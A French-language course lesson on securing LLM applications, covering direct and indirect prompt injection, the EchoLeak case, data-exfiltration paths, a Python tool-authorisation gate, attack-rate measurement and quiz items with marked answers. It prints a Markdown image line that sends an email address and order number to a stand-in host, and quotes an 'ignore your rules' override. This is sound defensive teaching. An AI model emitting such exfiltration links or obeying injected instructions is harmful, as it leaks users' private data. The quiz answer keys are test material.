---
title: Sécuriser les applications d'IA
summary: Comment sont construites les applications à base de LLM, pourquoi instructions et données se mélangent, la triade fatale dans des incidents réels, et les défenses d'architecture qui tiennent, mesurées correctement.
builds: un modèle de menaces d'une application d'IA, et un plan de défense
source: OWASP GenAI Security Project (en anglais) | https://genai.owasp.org/
words: RAG, prompt système, appel d'outils
---
Tout le monde livre des fonctions d'IA, et quelqu'un doit répondre à « est-ce assez sûr pour être livré ? ». La [leçon 70](/courses/0070-how-language-models-work/) vous a montré comment fonctionne le modèle, et l'[introduction à la sécurité des LLM](/guides/d2-llm-security-primer/) vous a donné la théorie. Cette leçon porte sur la construction d'une application sûre.

@term prompt système = Les instructions cachées qu'un opérateur donne à un modèle de langage.
@term fenêtre de contexte = La quantité de texte qu'un modèle peut prendre en compte à la fois.
@term RAG (génération augmentée par récupération) = Aller chercher des documents pertinents et les donner à un modèle pour qu'il réponde à partir d'eux.
@term appel d'outils = Permettre à un modèle de demander des actions, comme une recherche ou l'envoi d'un message.
@term MCP (Model Context Protocol) = Un protocole ouvert qui relie les applications d'IA à des outils et à des données.
@term garde-fou = Un filtre qui vérifie les entrées ou les sorties d'un modèle.
@term injection de prompt directe = Un utilisateur qui tape des instructions destinées à passer outre les règles du système.
@term injection de prompt indirecte = Des instructions cachées dans un contenu que le modèle lit, comme une page web ou un ticket.
@term agentivité excessive = Donner à un système d'IA plus de pouvoir que sa tâche n'en demande.

## Comment est construite une application à base de LLM

@flow Saisie de l'utilisateur > L'application ajoute le prompt système et les documents récupérés > Modèle > Appels d'outils ou réponse > Affichage pour l'utilisateur

Chaque flèche est un endroit où réfléchir à la confiance. Le modèle voit tout comme un seul flot de texte, et c'est la racine du problème.

Comparez avec une base de données. Au Mois 6, vous avez appris qu'une requête paramétrée garde le code et les données séparés, si bien qu'une entrée ne peut pas devenir une commande. **Les modèles de langage n'ont pas d'équivalent.** Vos instructions et le texte d'un attaquant arrivent dans le même flot, et le modèle ne sait pas les distinguer de façon fiable. C'est pourquoi l'injection de prompt n'est pas un bug qu'un seul correctif refermera.

?? Pourquoi ne peut-on pas corriger l'injection de prompt comme on a corrigé l'injection SQL ?
+ Les modèles n'ont aucun canal séparé pour leurs instructions
- Les modèles sont écrits dans un langage trop dangereux
- Personne n'a encore essayé de filtrer les entrées reçues
- Les prompts sont toujours chiffrés avant d'atteindre le modèle
=> SQL a obtenu des paramètres : une séparation nette entre code et données. Un modèle lit tout comme du texte, donc il n'existe aucune séparation de ce genre à faire respecter.

## Directe et indirecte

| Type | Qui l'écrit | Exemple |
|---|---|---|
| **Directe** | L'utilisateur | Dire à un chatbot d'ignorer ses règles |
| **Indirecte** | Un tiers | Une page web, un ticket ou un PDF que l'assistant lira plus tard |

L'indirecte est la dangereuse. La victime utilise l'assistant normalement, et l'attaquant ne l'a jamais touché. En 2025, [EchoLeak (CVE-2025-32711)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711) a montré ce schéma à grande échelle : un courriel bien construit pouvait amener un assistant d'IA à divulguer des données, sans aucun clic de l'utilisateur.

?? Un outil de résumé lit une page web qui contient un texte caché lui demandant de révéler les notes de l'utilisateur. De quel type s'agit-il ?
+ Indirecte, parce que c'est un tiers qui l'a écrite
- Directe, parce que l'utilisateur a lui-même ouvert la page
- Aucune, une page web ne contient pas de texte
- Directe, parce que le modèle a lu toute l'instruction
=> L'instruction venait du contenu, pas de l'utilisateur. C'est ce qui la rend si difficile à repérer.

## Cartographier la confiance

Pour toute fonction d'IA, répondez aux questions de la [triade](/guides/d2-llm-security-primer/) :

| Question | Exemple |
|---|---|
| Quelles données privées peut-elle atteindre ? | Les dossiers clients |
| Quel contenu non fiable lit-elle ? | Des courriels, des pages web, des fichiers envoyés |
| Comment les données peuvent-elles sortir ? | Envoyer un courriel, afficher des images, appeler des API |

Si les trois sont présents, vous avez un sérieux problème de conception, et aucun prompt ne le corrigera. N'oubliez pas les sorties discrètes : un modèle qui produit une image Markdown fait demander une URL au navigateur, et cette URL peut transporter des données.

Les trois questions peuvent se poser pour chaque outil de la fonction. Si un outil lit des données privées, qu'un autre lit du contenu non fiable, et qu'un troisième peut envoyer des données dehors, la fonction a la triade dans son ensemble, même si aucun outil ne semble dangereux à lui seul.

@code trifecta-check

La sortie discrète mérite qu'on la regarde de plus près. Supposons que la réponse d'un modèle contienne cette ligne :

```
![status](https://collector.example/pixel.png?d=ana%40example.com%2C+order+4471)
```

L'utilisateur voit une image cassée, ou rien du tout. Pendant ce temps, le navigateur a demandé cette adresse, et la partie qui suit `?d=` transporte une adresse électronique et un numéro de commande jusqu'à celui qui gère `collector.example`. Personne n'a cliqué sur rien. La défense se trouve dans votre code d'affichage : n'autorisez les images et les liens que depuis des hôtes de confiance, et retirez le reste avant que la réponse n'atteigne la page.

@code exfil-links

@drill trifecta

?? Un bot de support lit les tickets du public et peut interroger tous les dossiers clients. Quelle est la correction la plus solide ?
+ Limiter son accès aux données de l'utilisateur
- Durcir encore la formulation du prompt système
- Demander aux clients d'écrire poliment leurs tickets
- Passer à un modèle bien plus précis
=> Une autorisation appliquée hors du modèle limite les dégâts, quoi qu'on parvienne à lui faire faire.

## Des défenses par conception

- **Limitez les outils par utilisateur et par tâche.** Un bot qui lit la commande d'un client ne devrait pas détenir un outil qui les lit toutes.
- **Appliquez l'autorisation dans votre code,** à chaque appel d'outil. Le modèle demande, votre code décide.
- **Exigez une validation humaine** pour les actions lourdes de conséquences.
- **Traitez le contenu récupéré comme des données,** jamais comme des instructions.
- **Encodez la sortie du modèle** avant de l'afficher.
- **Tenez une liste blanche des destinations sortantes.**
- **Journalisez chaque prompt et chaque appel d'outil.**

Les deuxième et troisième points se ramènent à une seule fonction placée entre le modèle et vos systèmes. Le modèle propose un appel, et la fonction décide à partir de faits que le modèle ne peut pas changer : qui est l'utilisateur, ce qu'il possède, et quels outils existent.

```python
def gate(call, user):
    if call["tool"] == "get_order":
        order = orders.get(call["args"]["order_id"])
        return "allow" if order and order["owner"] == user else "deny"
    if call["tool"] == "send_email":
        return "needs approval"
    return "deny"
```

Un outil inconnu est refusé, pas transmis. Lire une commande n'est permis qu'à son propriétaire, quoi que dise la conversation. Envoyer un courriel attend toujours une personne.

@code tool-gate

Remarquez qu'aucune de ces défenses ne dépend du bon comportement du modèle. Les **garde-fous** aident comme couche supplémentaire, mais tout ce qui filtre du texte peut être contourné en reformulant. Partez du principe que le modèle sera trompé, et limitez ce qui se passe ensuite.

@drill llm-risk

?? Quelle mesure fonctionne encore si un attaquant contrôle entièrement la sortie du modèle ?
+ Un contrôle en code, à chaque appel d'outil
- Une règle formulée très fermement dans un prompt
- Une demande polie au modèle de rester honnête
- Un filtre qui cherche toutes les phrases suspectes
=> Le code hors du modèle ne négocie pas. C'est le test d'une vraie mesure.

## Enquêtez sur un cas

Un assistant a envoyé un courriel que personne n'avait demandé. Découvrez ce qui s'est passé à partir de ses journaux.

@range aiops

## Mesurer, pas espérer

Les modèles ne sont pas déterministes. Traitez cela comme des tests : définissez les cas de test, lancez chacun de nombreuses fois sur votre propre application, et rapportez des taux avant et après un changement. Des outils comme [promptfoo](https://www.promptfoo.dev/) mettent cela dans la CI. Souvenez-vous de la règle de la feuille de route : un constat n'en est pas un tant qu'il ne se reproduit pas.

Un tableau de résultats rend le changement visible. Lancez chaque cas d'attaque, disons, 20 fois avant une correction et 20 fois après :

| Cas | Avant | Après |
|---|---|---|
| Instruction cachée dans un ticket | 9 sur 20 | 0 sur 20 |
| Image Markdown avec des données | 14 sur 20 | 0 sur 20 |
| « Ignore tes règles » tapé directement | 2 sur 20 | 1 sur 20 |

La troisième ligne n'est pas arrivée à zéro, et le rapport doit le dire au lieu de l'arrondir. Un succès sur 20 veut quand même dire que cela arrivera en production.

@code attack-rates

?? Une attaque a fonctionné une fois, en une seule tentative. Que doit dire votre rapport ?
+ Rien de définitif avant qu'elle ne se répète
- Que le système est prouvé cassé pour tous
- Que le modèle est sûr, puisque c'est rare
- Que l'attaque est désormais impossible à jamais reproduire
=> Les modèles varient d'une exécution à l'autre. Un taux de succès sur N essais, avec les conditions exactes, est ce qui en fait un constat.

## La gouvernance

Connaissez les noms : [MITRE ATLAS](https://atlas.mitre.org/), le [NIST AI RMF](https://www.nist.gov/itl/ai-risk-management-framework), ISO/IEC 42001 et le règlement européen sur l'IA.

| Nom | Ce que c'est |
|---|---|
| OWASP LLM Top 10 (2025) | Les risques courants des applications à base de LLM |
| OWASP Agentic Top 10 (déc. 2025) | Les risques propres aux agents |
| MITRE ATLAS | Une base de connaissances à la manière d'ATT&CK sur les attaques contre l'IA |
| NIST AI RMF | Un cadre volontaire pour gérer le risque lié à l'IA |
| ISO/IEC 42001 | Une norme certifiable de système de management de l'IA |
| Règlement européen sur l'IA | Une loi de l'UE qui fixe des obligations selon le risque de l'IA |

::: try Engagez-vous sur une voie
À la fin de ce mois, rédigez votre note d'engagement sur une voie. Voyez [choisir votre voie](/guides/c2-choosing-your-track/). Corrigez ensuite un vrai système sur la [machine Parrot](/machines/parrot/).
:::

?? Laquelle de ces références permet de certifier une organisation ?
+ ISO/IEC 42001, la norme de management de l'IA
- MITRE ATLAS, la base de connaissances des attaques
- Le Top 10 de l'OWASP pour les LLM
- Le NIST AI RMF, un simple cadre volontaire
=> ISO/IEC 42001 est une norme de système de management, comme ISO 27001, donc un organisme accrédité peut certifier par rapport à elle. Les autres sont des guides et des bases de connaissances.

## Relire une fonction d'IA

Une équipe vous demande d'approuver un assistant de messagerie avant son lancement.

```
Outils :    read_inbox, search_crm (tous les clients), send_email (n'importe quelle adresse)
Sécurité :  le prompt système dit « N'envoie jamais de données client hors de l'entreprise. »
Affichage : les réponses sont rendues en Markdown, images comprises.
```

?? Quels pieds de la triade possède-t-il ?
+ Les trois, à travers ses trois outils
- Seulement des données privées, via le CRM
- Aucun, puisqu'il ne sert qu'en interne ici
- Seulement une sortie, puisqu'il envoie des courriels
=> La boîte de réception fait entrer du texte non fiable, le CRM contient des données privées, et l'envoi de courriels comme l'affichage d'images sont des sorties. C'est cette combinaison qui pose le problème de conception.

?? Pourquoi la ligne du prompt système n'est-elle pas une mesure ?
+ Des instructions injectées peuvent passer outre le texte d'un prompt
- Les prompts système sont toujours visibles par chaque utilisateur final
- Le modèle ne lit pas les prompts écrits en anglais
- Les assistants de messagerie n'ont jamais droit au prompt système
=> Une règle écrite en texte est en concurrence avec d'autres textes. Limiter `send_email` à des destinataires approuvés dans le code, avec une validation humaine, tient quoi qu'on dise au modèle.

?? Que changeriez-vous dans l'affichage ?
+ N'autoriser que les images des hôtes de confiance
- Afficher les réponses en HTML plutôt qu'en Markdown
- Agrandir nettement chaque image de toute la réponse
- Ajouter un avertissement sur la lenteur des images
=> Une image Markdown est une requête sortante que personne n'approuve. Retirez les images et les liens vers des hôtes inconnus avant l'affichage.

?! Choisissez un outil d'IA que vous utilisez. Répondez pour lui aux trois questions de la triade. Que changeriez-vous ?
